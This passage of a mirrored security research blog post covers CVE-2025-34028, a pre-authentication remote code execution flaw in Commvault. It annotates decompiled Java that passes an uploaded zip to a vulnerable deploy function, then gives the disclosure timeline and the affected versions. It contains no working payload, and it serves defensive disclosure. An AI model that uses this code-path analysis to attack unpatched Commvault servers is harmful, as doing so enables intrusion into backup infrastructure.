request.getParts();<br>            String servicePack = &quot;&quot;;<br>            String version = &quot;&quot;;<br>            InputStream fileContent = null;<br>            Iterator var6 = parts.iterator();<br><br>            while(true) &#123;<br>                String fieldValue;<br>                while(var6.hasNext()) &#123;<br>                    Part part = (Part)var6.next();<br>                    if (part.getContentType() != null &amp;&amp; part.getContentType().startsWith(&quot;text&quot;)) &#123;<br>                        fieldValue = IOUtils.toString(part.getInputStream(), StandardCharsets.UTF_8);<br>                        if (part.getName().contentEquals(&quot;servicePack&quot;)) &#123;<br>                            servicePack = &quot;SP&quot; + fieldValue;<br>                        &#125; else if (part.getName().contentEquals(&quot;version&quot;)) &#123;<br>                            version = fieldValue;<br>                        &#125;<br>                    &#125; else if (part.getContentType() != null &amp;&amp; part.getContentType().startsWith(&quot;application/octet-stream&quot;)) &#123;<br>                        fileContent = part.getInputStream(); &lt;---- [9]<br>                    &#125;<br>                &#125;<br><br>                if (fileContent != null &amp;&amp; !CVCoreUtil.isNullOrEmpty(version) &amp;&amp; !CVCoreUtil.isNullOrEmpty(servicePack)) &#123;<br>                    String BASE_PATH = this.extractPath(this.fileZipUtil.getResourcePath(&quot;&quot;), false);<br>                    String DIST_CC_PATH = BASE_PATH + File.separator + &quot;AdminConsole&quot; + File.separator + &quot;dist-cc-sps&quot; + File.separator;<br>                    fieldValue = BASE_PATH + File.separator + &quot;Apache&quot; + File.separator + &quot;conf&quot; + File.separator + &quot;ccPackages&quot; + File.separator;<br>                    File confDirectory = this.createDirectory(fieldValue + servicePack);<br>                    this.createDirectory(DIST_CC_PATH);<br>                    File servicePackFolder = new File(DIST_CC_PATH + servicePack);<br>                    File versionFile;<br>                    String var10002;<br>                    if (servicePackFolder.exists()) &#123;<br>                        var10002 = servicePackFolder.getPath();<br>                        versionFile = new File(var10002 + File.separator + &quot;version.txt&quot;);<br>                        if (versionFile.exists()) &#123;<br>                            String currentVersion = (new String(Files.readAllBytes(Paths.get(versionFile.getPath())))).trim();<br>                            if (currentVersion.compareTo(version) &gt;= 0) &#123;<br>                                logger.debug(&quot;No CC deploy needed as latest version is already deployed.&quot;);<br>                                return;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br><br>                    var10002 = confDirectory.getAbsolutePath();<br>                    versionFile = new File(var10002 + File.separator + &quot;version.txt&quot;);<br>                    FileUtils.writeStringToFile(versionFile, version, StandardCharsets.UTF_8, false);<br>                    FileOutputStream out = new FileOutputStream(new File(confDirectory, &quot;dist-cc.zip&quot;));<br><br>                    try &#123;<br>                        byte[] buffer = new byte[1024];<br><br>                        int len;<br>                        while((len = fileContent.read(buffer)) != -1) &#123;<br>                            out.write(buffer, 0, len);<br>                        &#125;<br>                    &#125; catch (Throwable var16) &#123;<br>                        try &#123;<br>                            out.close();<br>                        &#125; catch (Throwable var15) &#123;<br>                            var16.addSuppressed(var15);<br>                        &#125;<br><br>                        throw var16;<br>                    &#125;<br><br>                    out.close();<br>                    this.deployCCPackage(servicePack); &lt;---- [10]<br><br></code></pre></td></tr></table></figure><p>Following the code path into <code>updateDeployPackages</code> ,we can see an almost replica of what we’ve already analysed.</p><p>However, in this circumstance, the zip file is read in from a multipart request <code>[9]</code> before being pushed into the vulnerable function <code>deployCCPackage</code> <code>[10]</code> . This, ultimately, allows threat actors to exploit environments where external HTTP requests may be proxied.</p><h2 id=Detection-Artefact-Generator><a href=#Detection-Artefact-Generator class=headerlink title="Detection Artefact Generator"></a>Detection Artefact Generator</h2><p>We’ve created a <a target=_blank rel=noopener href="https://github.com/watchtowrlabs/watchTowr-vs-Commvault-PreAuth-RCE-CVE-2025-34028?ref=labs.watchtowr.com"><strong>Detection</strong> <strong>Artefact Generator</strong></a> for sysadmins, engineers and others to determine if their instance is vulnerable.</p><p><img src=http://www.18k.icu/images/20250703_08_a3qaf0q0/img_14.jpg></p><h2 id=Comms-with-Commvault><a href=#Comms-with-Commvault class=headerlink title="Comms with Commvault"></a>Comms with Commvault</h2><p>We contacted Commvault PSIRT, who have been a pleasure to deal with, informing them of the Remote Code Execution chain (that we achieved via SSRF &lt;&gt; Arbitrary File Write chaining) on April 7, 2025.</p><p>Commvault released a patch for these vulnerabilities on April 10, 2025, and subsequently released an advisory on April 17, 2025 - <a target=_blank rel=noopener href="https://documentation.commvault.com/securityadvisories/CV_2025_04_1.html?ref=labs.watchtowr.com">https://documentation.commvault.com/securityadvisories/CV_2025_04_1.html</a>.</p><p>The article released by Commvault details the affected and remediated version table below:</p><table><thead><tr><th><strong>Product</strong></th><th><strong>Platforms</strong></th><th><strong>Affected Versions</strong></th><th><strong>Resolved Version</strong></th><th><strong>Status</strong></th></tr></thead><tbody><tr><td>Commvault</td><td>Linux, Windows</td><td>11.38.0 - 11.38.19</td><td>11.38.20</td><td>Resolved</td></tr></tbody></table><p>Commvault PSIRT has communicated that this vulnerability affects explicitly their <em>Innovation Release</em>, which appears to maintain the cutting-edge features of the Commvault solution; the vulnerable function is apparently only a recent addition.</p><p>Impressively though the turnaround time from reporting to patching and advisory has to be record-breaking in our experience! (1 week!)</p><p>Admittedly, we were at first concerned when we saw highlighted affected versions in the advisory from Commvault - as we had initially reported the vulnerabilities mentioned above in version <code>11.38.20</code> . Curiously, however, Commvault has listed this version as being patched.</p><p>Naturally, we informed Commvault that we had tested both <code>11.38.5</code> and <code>11.38.20</code> and requested a clear affected version range on April 9. Commvault responded rapidly on April 10, confirming what we already knew - we’re generally wrong.</p><blockquote><p><em>“We have already fixed this issue in the current supported Technology Preview versions which is 11.38.20 and above.”</em></p></blockquote><h2 id=Timeline><a href=#Timeline class=headerlink title=Timeline></a>Timeline</h2><table><thead><tr><th>Date</th><th>Detail</th></tr></thead><tbody><tr><td>7th April 2025</td><td>Vulnerability discovered</td></tr><tr><td>7th April 2025</td><td>Vulnerability disclosed to CommVault in version <code>11.38.20</code></td></tr><tr><td>7th April 2025</td><td>watchTowr hunts through client attack surfaces for impacted systems, and communicates with those affected</td></tr><tr><td>8th April 2025</td><td>Commvault acknowledges the vulnerability and begins remediation</td></tr><tr><td>10th April 2025</td><td>Commvault release a fix for versions <code>11.38.20</code> and above</td></tr><tr><td>17th April 2025</td><td>Commvault publishes an <a target=_blank rel=noopener href="https://documentation.commvault.com/securityadvisories/CV_2025_04_1.html?ref=labs.watchtowr.com">advisory</a></td></tr><tr><td>22nd April 2025</td><td>watchTowr requests CVE assignment via VulnCheck as a CNA. CVE-2025-34028 is assigned.</td></tr><tr><td>24th April 2025</td><td>Blogpost and PoC release</td></tr></tbody></table></div></div><div class=footer id=footer><p>Copyright © 2025 <a class=flink target=_blank rel=noopener href=http://www.18k.icu>www.18k.icu</a> <label class="el-switch el-switch-green el-switch-sm" style=vertical-align:sub><input type=checkbox name=switch id=update_style> <span class=el-switch-style></span></label></p></div><input type=hidden id=web_style value=black> <input type=hidden id=valine_appid value=CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz> <input type=hidden id=valine_appKey value=FqiyUqbg7McKN2eG0MCewupf><script src=https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js></script><script src=/libs/highlight/highlight.pack.js></script><script src=/js/js.js></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#3a3e4a}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script>var _hmt=_hmt||[];(()=>{var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?eb7eb8199824646269cd262b46a87950",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)})()</script></body></html>